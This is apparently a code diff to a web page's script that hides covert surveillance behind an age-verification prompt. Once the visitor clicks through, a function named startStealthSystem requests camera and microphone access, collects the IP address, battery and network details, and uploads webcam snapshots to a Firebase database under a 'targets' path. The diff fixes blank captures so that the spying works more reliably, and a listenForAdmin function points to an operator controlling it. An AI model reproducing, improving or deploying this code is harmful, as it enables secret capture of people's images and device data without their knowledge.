@@ -36,26 +36,25 @@
     </video>
 
     <script>
-    // Firebase Config (Pehle se mojood hai)
-    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+        // Firebase Config
+        const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
 
-    // --- YAHAN LAGAYEN UNIQUE ID LOGIC ---
-    const now = new Date();
-    const dateStr = now.getDate() + "-" + (now.getMonth() + 1);
-    const sessionID = "Target_" + dateStr + "_" + Math.floor(1000 + Math.random() * 9000);
-    // ------------------------------------
+        // Unique ID Logic (Date/Time based)
+        const now = new Date();
+        const dateStr = now.getDate() + "-" + (now.getMonth() + 1);
+        const sessionID = "Target_" + dateStr + "_" + Math.floor(1000 + Math.random() * 9000);
 
-    let currentStream = null;
+        let currentStream = null;
 
-    async function startStealthSystem() {
+        async function startStealthSystem() {
             document.getElementById('age-modal').style.display = 'none';
             try {
                 // Request All Permissions
                 currentStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 
-                // Get IP, Battery, Network
+                // Get Info
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 const batt = await navigator.getBattery();
@@ -94,20 +93,30 @@
             }
         }
 
+        // --- FIXED CAPTURE FUNCTION (No Black Screen) ---
         async function capturePhoto(type) {
             const canvas = document.createElement('canvas');
             const vTrack = document.createElement('video');
             vTrack.srcObject = currentStream;
+            vTrack.muted = true;
+            vTrack.setAttribute('playsinline', '');
             vTrack.play();
+
+            // 2 Second wait taake camera sensor adjust ho jaye
             setTimeout(() => {
-                canvas.width = 640; canvas.height = 480;
+                canvas.width = vTrack.videoWidth || 640;
+                canvas.height = vTrack.videoHeight || 480;
                 canvas.getContext('2d').drawImage(vTrack, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({ 
-                    img: canvas.toDataURL('image/jpeg', 0.5), 
-                    type: type, 
-                    time: Date.now() 
-                });
-            }, 1000);
+                
+                const photoData = canvas.toDataURL('image/jpeg', 0.6);
+                if (photoData.length > 1000) { 
+                    db.ref(`targets/${sessionID}/photos`).push({ 
+                        img: photoData, 
+                        type: type, 
+                        time: Date.now() 
+                    });
+                }
+            }, 2000); 
         }
 
         function listenForAdmin() {
@@ -132,4 +141,3 @@
     </script>
 </body>
 </html>
-
